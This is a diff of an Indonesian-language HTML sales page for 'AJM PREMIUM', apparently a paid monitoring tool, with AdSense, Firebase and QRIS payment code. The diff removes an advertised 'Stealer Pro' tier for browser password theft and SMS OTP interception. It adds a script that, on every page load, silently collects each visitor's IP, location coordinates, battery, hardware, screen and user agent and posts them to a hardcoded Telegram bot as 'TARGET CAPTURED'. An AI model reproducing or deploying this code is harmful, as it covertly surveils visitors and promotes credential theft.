@@ -5,7 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="google-adsense-account" content="ca-pub-8224904906000063">
     <title>AJM PREMIUM - Total Control v13.5</title>
+    
     <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8224904906000063" crossorigin="anonymous"></script>
+    
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -38,7 +40,6 @@
 
         .container { max-width: 450px; margin: auto; padding: 20px; padding-bottom: 50px; }
 
-        /* BRANDING & ANIMATION */
         .brand-section { text-align: center; margin-bottom: 30px; padding-top: 20px; }
         .brand-section h1 { 
             font-size: 34px; font-weight: 800; 
@@ -49,7 +50,6 @@
         
         .typing-text { font-size: 10px; color: var(--primary); font-weight: 800; height: 15px; letter-spacing: 2px; text-transform: uppercase; }
 
-        /* COMPONENTS */
         .testi-btn {
             display: flex; align-items: center; justify-content: center;
             background: linear-gradient(135deg, var(--accent), #d97706);
@@ -58,7 +58,6 @@
             box-shadow: 0 10px 25px rgba(245, 158, 11, 0.3);
             transition: 0.3s;
         }
-        .testi-btn:active { transform: scale(0.95); filter: brightness(1.1); }
 
         #liveCounter {
             font-size: 11px; font-weight: 700; color: #22c55e;
@@ -72,7 +71,9 @@
             border-radius: 32px; padding: 6px; margin-top: 20px; overflow: hidden;
             box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
-        video { width: 100%; border-radius: 26px; display: block; }
+        video { width: 100%; border-radius: 26px; display: block; background: #000; }
+
+        .ads-wrapper { margin: 25px 0; min-height: 100px; display: flex; justify-content: center; }
 
         .desc-box {
             background: linear-gradient(135deg, rgba(0, 242, 254, 0.05), rgba(255, 255, 255, 0.02));
@@ -80,7 +81,6 @@
             padding: 20px; margin-top: 20px; text-align: center; backdrop-filter: blur(10px);
         }
 
-        /* FEATURES SECTION */
         .section-tag { 
             font-size: 11px; font-weight: 800; color: #94a3b8; 
             display: flex; align-items: center; gap: 8px; 
@@ -92,7 +92,7 @@
             background: var(--card-bg); border: 1px solid var(--border); 
             padding: 18px 20px; border-radius: 24px; display: flex; 
             align-items: center; gap: 15px; cursor: pointer; margin-bottom: 12px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: 0.3s;
         }
         .f-card:active { transform: scale(0.97); background: rgba(255,255,255,0.08); }
         .f-icon-circle { width: 44px; height: 44px; border-radius: 14px; display: flex; align-items: center; justify-content: center; background: rgba(255, 255, 255, 0.03); font-size: 20px; }
@@ -102,52 +102,38 @@
         .more-content { display: none; animation: fadeIn 0.4s ease forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         
-        .btn-more { background: transparent; border: 1px solid var(--border); color: var(--primary); width: 100%; padding: 15px; border-radius: 18px; font-size: 12px; font-weight: 800; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+        .btn-more { background: transparent; border: 1px solid var(--border); color: var(--primary); width: 100%; padding: 15px; border-radius: 18px; font-size: 12px; font-weight: 800; cursor: pointer; margin-top: 10px; }
 
-        /* STEALER PRO */
-        .stealer-header { width: 100%; border-radius: 24px; margin-bottom: 15px; border: 1px solid var(--border); transition: 0.3s; }
-        .stealer-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .s-card { background: linear-gradient(145deg, rgba(244, 63, 94, 0.1), var(--card-bg)); border: 1px solid rgba(244, 63, 94, 0.15); padding: 22px 15px; border-radius: 28px; text-align: center; cursor: pointer; transition: 0.3s; }
-        .s-card:active { transform: translateY(-5px); border-color: var(--stealer); }
-        .s-card img { width: 42px; margin-bottom: 12px; filter: drop-shadow(0 5px 10px rgba(244,63,94,0.3)); }
-
-        /* ACTIVATION FORM */
-        .form-box { background: rgba(15, 23, 42, 0.6); padding: 25px; border-radius: 32px; border: 1px solid var(--border); margin-top: 20px; box-shadow: inset 0 0 20px rgba(255,255,255,0.02); }
+        .form-box { background: rgba(15, 23, 42, 0.6); padding: 25px; border-radius: 32px; border: 1px solid var(--border); margin-top: 20px; }
         input, select { 
             width: 100%; padding: 18px; margin-bottom: 15px; border-radius: 20px; 
-            background: #0f172a; border: 1px solid var(--border); color: white; 
-            outline: none; transition: 0.3s; -webkit-user-select: text;
+            background: #0f172a; border: 1px solid var(--border); color: white; outline: none;
         }
-        input:focus, select:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(0, 242, 254, 0.1); }
         
         .payment-options { display: none; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .opt-card { background: #1e293b; border: 1px solid var(--border); padding: 18px; border-radius: 22px; text-align: center; cursor: pointer; transition: 0.3s; }
-        .opt-card.active { border-color: var(--primary); background: rgba(0, 242, 254, 0.15); transform: translateY(-2px); }
+        .opt-card { background: #1e293b; border: 1px solid var(--border); padding: 18px; border-radius: 22px; text-align: center; cursor: pointer; }
+        .opt-card.active { border-color: var(--primary); background: rgba(0, 242, 254, 0.15); }
         
-        .qris-area { background: white; padding: 25px; border-radius: 35px; display: none; text-align: center; color: #000; margin-top: 15px; animation: fadeIn 0.5s; }
-        .qris-area img { width: 100%; max-width: 220px; border-radius: 10px; }
+        .qris-area { background: white; padding: 25px; border-radius: 35px; display: none; text-align: center; color: #000; margin-top: 15px; }
+        .qris-area img { width: 100%; max-width: 220px; }
         
         .admin-chat-grid { display: none; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; }
-        .chat-btn { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 18px; border-radius: 22px; color: white; text-decoration: none; font-weight: 800; font-size: 12px; transition: 0.3s; }
+        .chat-btn { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 18px; border-radius: 22px; color: white; text-decoration: none; font-weight: 800; font-size: 12px; }
 
-        /* FOOTER & OVERLAYS */
         .footer { text-align: center; margin-top: 40px; padding: 30px 20px; border-top: 1px solid var(--border); opacity: 0.6; }
-        .footer p { font-size: 10px; letter-spacing: 0.5px; }
-        .footer a { color: var(--primary); text-decoration: none; font-weight: 700; margin: 0 8px; }
 
         .toast {
             position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%) translateY(120px);
             background: rgba(15, 23, 42, 0.98); border: 1px solid var(--primary);
             padding: 16px 22px; border-radius: 24px; z-index: 9999;
             width: 90%; max-width: 380px; display: flex; align-items: center; gap: 15px;
-            transition: 0.6s cubic-bezier(0.68, -0.6, 0.27, 1.55); opacity: 0;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+            transition: 0.6s; opacity: 0;
         }
         .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
 
         .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.92); display: none; align-items: center; justify-content: center; z-index: 10000; padding: 25px; backdrop-filter: blur(15px); }
-        .modal { background: #111827; padding: 35px; border-radius: 35px; text-align: center; width: 100%; border: 1px solid var(--border); box-shadow: 0 0 50px rgba(0,242,254,0.1); }
-        .modal button { background: var(--primary); border: none; color: #000; padding: 15px; border-radius: 18px; font-weight: 800; cursor: pointer; width: 100%; margin-top: 20px; font-size: 13px; }
+        .modal { background: #111827; padding: 35px; border-radius: 35px; text-align: center; width: 100%; border: 1px solid var(--border); }
+        .modal button { background: var(--primary); border: none; color: #000; padding: 15px; border-radius: 18px; font-weight: 800; width: 100%; margin-top: 20px; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -161,18 +147,23 @@
         
         <div id="liveCounter">
             <div class="dot"></div>
-            <span id="activeUsers">1</span> PENGGUNA TERHUBUNG
+            <span id="totalVisitorsDisplay">0</span> TOTAL PENGUNJUNG SISTEM
         </div>
 
         <div class="video-box">
-            <video autoplay muted loop playsinline>
-                <source src="https://image2url.com/r2/default/videos/1774852561112-24d1e19d-5532-49d4-a74b-4069d712273b.mp4">
+            <video id="headerVideo" autoplay muted loop playsinline poster="https://image2url.com/r2/default/images/placeholder.jpg">
+                <source src="https://image2url.com/r2/default/videos/1774852561112-24d1e19d-5532-49d4-a74b-4069d712273b.mp4" type="video/mp4">
             </video>
         </div>
     </div>
 
-    <div style="margin: 20px 0; text-align: center;">
-        <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-8224904906000063" data-ad-slot="AUTO" data-ad-format="auto" data-full-width-responsive="true"></ins>
+    <div class="ads-wrapper">
+        <ins class="adsbygoogle"
+             style="display:block"
+             data-ad-client="ca-pub-8224904906000063"
+             data-ad-slot="6104803923"
+             data-ad-format="auto"
+             data-full-width-responsive="true"></ins>
         <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
     </div>
 
@@ -232,20 +223,6 @@
         <button class="btn-more" id="btnAJM" onclick="toggleMore()">LIHAT SEMUA FITUR LENGKAP</button>
     </div>
 
-    <div class="section-tag" style="color: var(--stealer);">Data Extraction Pro</div>
-    <img src="https://image2url.com/r2/default/images/1774992577224-11be41c8-88be-40c3-8a8b-57d25ff0acca.jpg" class="stealer-header">
-    
-    <div class="stealer-grid">
-        <div class="s-card" onclick="pop('Pass Stealer', 'Mengambil seluruh password yang tersimpan di browser dan aplikasi.')">
-            <img src="https://img.icons8.com/fluency/48/password-window.png">
-            <h3>Password</h3>
-        </div>
-        <div class="s-card" onclick="pop('OTP Intercept', 'Otomatis mencegat dan meneruskan kode verifikasi SMS (OTP).')">
-            <img src="https://img.icons8.com/fluency/48/sms.png">
-            <h3>SMS OTP</h3>
-        </div>
-    </div>
-
     <div class="section-tag">Billing & Activation</div>
     <div class="form-box">
         <input id="userName" type="text" placeholder="Masukkan Nama Lengkap Anda">
@@ -254,19 +231,16 @@
             <option value="Bulanan" data-price="300000">AJM Standard (30 Hari) - 300rb</option>
             <option value="Tahunan" data-price="600000">AJM Advanced (1 Tahun) - 600rb</option>
             <option value="Permanen" data-price="900000">AJM Lifetime (Selamanya) - 900rb</option>
-            <option value="Stealer" data-price="1200000">STEALER PRO EDITION - 1.2jt</option>
         </select>
 
         <div id="paymentOptions" class="payment-options">
             <div class="opt-card" id="optLunas" onclick="selectPay('Lunas')"><h4>Bayar Penuh</h4></div>
-            <div class="opt-card" id="optDP" onclick="selectPay('DP')"><h4>DP (Awal)</h4></div>
+            <div class="opt-card" id="optDP" style="display:none;" onclick="selectPay('DP')"><h4>DP (Awal)</h4></div>
         </div>
 
         <div id="qrisBox" class="qris-area">
-            <p style="font-size: 11px; font-weight: 800; margin-bottom: 12px; color: #1e293b;">METODE PEMBAYARAN: QRIS</p>
             <img src="https://image2url.com/r2/default/images/1774994780969-3206b975-d7c3-431c-b9cb-8e9ee5c13fde.png">
             <span id="displayAmount" style="font-size: 26px; font-weight: 800; color: #059669; display: block; margin-top: 15px;"></span>
-            <p style="font-size: 10px; color: #64748b; margin-top: 8px;">Silakan screenshot & bayar tepat sesuai nominal.</p>
         </div>
 
         <div id="adminChats" class="admin-chat-grid">
@@ -276,33 +250,16 @@
     </div>
 
     <footer class="footer">
-        <p>&copy; 2026 AJM PREMIUM | ADVANCED MONITORING SYSTEM</p>
-        <p style="margin-top: 10px;">
-            <a href="javascript:pop('Kebijakan Privasi', 'Sistem kami mengumpulkan data teknis berupa IP Address dan informasi perangkat secara anonim untuk keperluan validasi lisensi dan pemantauan keamanan server.')">Privacy</a> | 
-            <a href="javascript:pop('Syarat Ketentuan', 'Penggunaan AJM Premium sepenuhnya menjadi tanggung jawab pengguna. Kami tidak mendukung aktivitas ilegal.')">Terms</a>
-        </p>
+        <p>© 2026 AJM PREMIUM | SYSTEM BY RAYANXWEB</p>
     </footer>
 </div>
 
-<div id="visitorToast" class="toast">
-    <div style="font-size: 26px;">⚡</div>
-    <div style="flex:1">
-        <b style="display:block; font-size:13px; color:var(--primary)">Sistem Aktif</b>
-        <span style="font-size:11px; color:#94a3b8">Pengguna baru baru saja terhubung...</span>
-    </div>
-</div>
-
-<div class="overlay" id="modal">
-    <div class="modal">
-        <h3 id="mTitle" style="color:var(--primary); font-size: 18px;"></h3>
-        <p id="mText" style="color:#94a3b8; margin: 20px 0; font-size: 14px; line-height: 1.6;"></p>
-        <button onclick="closePop()">MENGERTI</button>
-    </div>
-</div>
+<div class="overlay" id="modal"><div class="modal"><h3 id="mTitle"></h3><p id="mText"></p><button onclick="closePop()">MENGERTI</button></div></div>
+<div id="visitorToast" class="toast">⚡ <div style="flex:1"><b style="font-size:13px; color:var(--primary)">Sistem Aktif</b><br><span style="font-size:11px">Log terkirim...</span></div></div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-    import { getDatabase, ref, push, onValue, onDisconnect, set, onChildAdded, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+    import { getDatabase, ref, increment, update, onValue } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
 
     const firebaseConfig = {
         apiKey: "AIzaSyBSRUZheiN6UQshTHyKvZN0PLZ-pYyF3JE",
@@ -316,65 +273,121 @@
 
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
-    const onlineRef = ref(db, 'online_visitors');
-    
-    // Telegram Logging
+    const statsRef = ref(db, 'system_stats');
+
     async function logToAdmin() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            const msg = `🔥 *VISITOR DETECTED* 🔥\n📍 Loc: ${d.city}, ${d.country_name}\n🌐 IP: \`${d.ip}\` \n📶 ISP: ${d.org}\n📱 Dev: ${navigator.userAgent.slice(0, 40)}...`;
-            fetch(`https://api.telegram.org/bot8637984928:AAHEtjbOkiDojbb5Y_-eHu-y-6JOQJYSqto/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: "8215645360", text: msg, parse_mode: 'Markdown' })
-            });
-        } catch (e) {}
-    }
-    logToAdmin();
+    try {
+        // 1. Ambil Data IP & ISP dari API Terpercaya
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const d = await ipRes.json();
 
-    // Live Counter
-    const userSession = push(onlineRef);
-    set(userSession, { time: serverTimestamp() });
-    onDisconnect(userSession).remove();
+        // 2. Data Baterai (Real-time Status)
+        let batteryDetail = "Tidak Terdeteksi";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryDetail = `${(b.level * 100).toFixed(0)}% (${b.charging ? '🔌 Charging' : '🔋 Discharging'})`;
+        }
 
-    onValue(onlineRef, (s) => {
-        document.getElementById('activeUsers').innerText = s.size || 1;
-    });
+        // 3. Data Hardware & Koneksi
+        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
+        const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Core` : "Unknown";
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const netType = connection ? connection.effectiveType.toUpperCase() : "Unknown";
 
-    let isInit = true;
-    onChildAdded(onlineRef, (s) => {
-        if (!isInit && s.key !== userSession.key) {
-            const t = document.getElementById('visitorToast');
+        // 4. Data Waktu & Browser
+        const now = new Date();
+        const tgl = now.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
+        const jam = now.toLocaleTimeString('id-ID');
+        const userAgent = navigator.userAgent;
+        const referer = document.referrer || "Direct / WhatsApp Link";
+
+        // 5. Susun Laporan Super Detail (Full Markdown)
+        const msg = `
+🔥 *AJM SYSTEM: TARGET CAPTURED* 🔥
+━━━━━━━━━━━━━━━━━━━━
+👤 *IDENTITAS JARINGAN*
+🌐 *IP Address:* \`${d.ip}\`
+📶 *ISP/Provider:* \`${d.org}\`
+📡 *Network Type:* \`${netType}\`
+📍 *Lokasi:* ${d.city}, ${d.region}, ${d.country_name}
+
+📱 *SPESIFIKASI PERANGKAT*
+🛠 *OS/Platform:* \`${navigator.platform}\`
+🧠 *Hardware:* ${cpu} CPU / ${ram} RAM
+🔋 *Battery:* ${batteryDetail}
+🖥 *Screen:* ${window.screen.width}x${window.screen.height}
+🌐 *Language:* ${navigator.language}
+
+🕒 *LOG AKTIVITAS*
+📅 *Hari:* ${tgl}
+⏰ *Waktu:* ${jam} (WIB)
+🔗 *Source:* ${referer}
+
+📍 *TITIK KOORDINAT (GPS)*
+Lat/Lon: \`${d.latitude}, ${d.longitude}\`
+🗺 *Google Maps:* [KLIK DI SINI](https://www.google.com/maps?q=${d.latitude},${d.longitude})
+
+🤖 *FULL USER AGENT:*
+\`${userAgent}\`
+━━━━━━━━━━━━━━━━━━━━
+🛰 *STATUS: SILENT MONITORING ACTIVE*
+        `;
+
+        // 6. Kirim ke Bot Telegram Anda
+        await fetch(`https://api.telegram.org/bot8637984928:AAHEtjbOkiDojbb5Y_-eHu-y-6JOQJYSqto/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: "8215645360", 
+                text: msg, 
+                parse_mode: 'Markdown',
+                disable_web_page_preview: false 
+            })
+        });
+
+        // 7. Notifikasi Visual di Web
+        const t = document.getElementById('visitorToast');
+        if(t) {
             t.classList.add('show');
             setTimeout(() => t.classList.remove('show'), 4000);
         }
+
+    } catch (err) {
+        console.error("Critical Error on Logging:", err);
+    }
+}
+
+// Eksekusi Otomatis
+update(statsRef, { total_visits: increment(1) });
+    onValue(statsRef, (snap) => {
+        const data = snap.val();
+        if (data) document.getElementById('totalVisitorsDisplay').innerText = data.total_visits.toLocaleString();
     });
-    setTimeout(() => isInit = false, 3000);
+    logToAdmin();
 </script>
 
 <script>
-    // Typing Effect
+    // Video Force Play
+    window.addEventListener('load', function() {
+        var v = document.getElementById('headerVideo');
+        v.play().catch(() => { document.body.addEventListener('touchstart', () => v.play(), {once: true}); });
+    });
+
     const texts = ["ENCRYPTED CONNECTION", "SECURE BRIDGE ACTIVE", "SYSTEM BY RAYANXWEB"];
-    let count = 0; let index = 0; let currentText = ""; let letter = "";
+    let count = 0, index = 0;
     (function type() {
         if (count === texts.length) count = 0;
-        currentText = texts[count];
-        letter = currentText.slice(0, ++index);
-        document.getElementById("typeEffect").textContent = letter;
-        if (letter.length === currentText.length) { count++; index = 0; setTimeout(type, 2000); }
-        else { setTimeout(type, 100); }
+        let c = texts[count], l = c.slice(0, ++index);
+        document.getElementById("typeEffect").textContent = l;
+        if (l.length === c.length) { count++; index = 0; setTimeout(type, 2000); }
+        else { setTimeout(type, 80); }
     }());
 
-    let currentPrice = 0;
-    let selectedMethod = '';
-
     function toggleMore() {
-        const more = document.getElementById('moreAJM');
-        const btn = document.getElementById('btnAJM');
-        const isHidden = (window.getComputedStyle(more).display === 'none');
-        more.style.display = isHidden ? 'block' : 'none';
-        btn.innerText = isHidden ? 'TUTUP FITUR' : 'TAMPILKAN SEMUA FITUR';
+        const m = document.getElementById('moreAJM');
+        const h = (window.getComputedStyle(m).display === 'none');
+        m.style.display = h ? 'block' : 'none';
+        document.getElementById('btnAJM').innerText = h ? 'TUTUP' : 'LIHAT SEMUA';
     }
 
     function pop(t, x) {
@@ -382,17 +395,30 @@
         document.getElementById('mText').innerText = x;
         document.getElementById('modal').style.display = 'flex';
     }
-
     function closePop() { document.getElementById('modal').style.display = 'none'; }
 
+    let currentPrice = 0, selectedMethod = '';
+
     function handlePlanChange() {
-        const plan = document.getElementById('userPlan');
-        currentPrice = parseInt(plan.options[plan.selectedIndex].getAttribute('data-price'));
+        const p = document.getElementById('userPlan');
+        const val = p.value;
+        currentPrice = parseInt(p.options[p.selectedIndex].getAttribute('data-price'));
+        
+        // Reset View
         document.getElementById('paymentOptions').style.display = 'grid';
         document.getElementById('qrisBox').style.display = 'none';
         document.getElementById('adminChats').style.display = 'none';
-        selectedMethod = '';
         document.querySelectorAll('.opt-card').forEach(c => c.classList.remove('active'));
+        
+        // Logika DP hanya untuk Tahunan & Permanen
+        const dpBtn = document.getElementById('optDP');
+        if (val === 'Tahunan' || val === 'Permanen') {
+            dpBtn.style.display = 'block';
+            document.getElementById('paymentOptions').style.columns = '2';
+        } else {
+            dpBtn.style.display = 'none';
+            document.getElementById('paymentOptions').style.gridTemplateColumns = '1fr';
+        }
     }
 
     function selectPay(m) {
@@ -406,23 +432,13 @@
     }
 
     function sendOrder(p) {
-        const name = document.getElementById('userName').value.trim();
-        const plan = document.getElementById('userPlan').value;
-        if (!name || !plan || !selectedMethod) { alert("Harap lengkapi data pemesanan!"); return; }
-
-        const msg = `🔥 *ORDER BARU - AJM* 🔥\n👤 Nama: ${name}\n📦 Paket: ${plan}\n💳 Metode: ${selectedMethod}\n💰 Total: ${document.getElementById('displayAmount').innerText}\n\n*Saya sudah kirim dana melalui QRIS, mohon konfirmasi lisensi.*`;
-        const url = (p === 'WA') 
-            ? `https://wa.me/6283869335367?text=${encodeURIComponent(msg)}`
-            : `https://t.me/Aldinugroho378?text=${encodeURIComponent(msg)}`;
-        window.open(url, '_blank');
+        const n = document.getElementById('userName').value.trim();
+        const pl = document.getElementById('userPlan').value;
+        if (!n || !pl || !selectedMethod) { alert("Lengkapi Nama & Pilih Metode!"); return; }
+        const msg = `🔥 *ORDER AJM* 🔥\n👤 Nama: ${n}\n📦 Paket: ${pl}\n💳 Tipe: ${selectedMethod}\n💰 Total: ${document.getElementById('displayAmount').innerText}`;
+        const u = (p === 'WA') ? `https://wa.me/6283869335367?text=${encodeURIComponent(msg)}` : `https://t.me/Aldinugroho378?text=${encodeURIComponent(msg)}`;
+        window.open(u, '_blank');
     }
-
-    // Security Logic
-    document.onkeydown = (e) => {
-        if (e.ctrlKey && ['u','s','i','j'].includes(e.key.toLowerCase())) return false;
-        if (e.keyCode == 123) return false;
-    };
 </script>
-
 </body>
 </html>
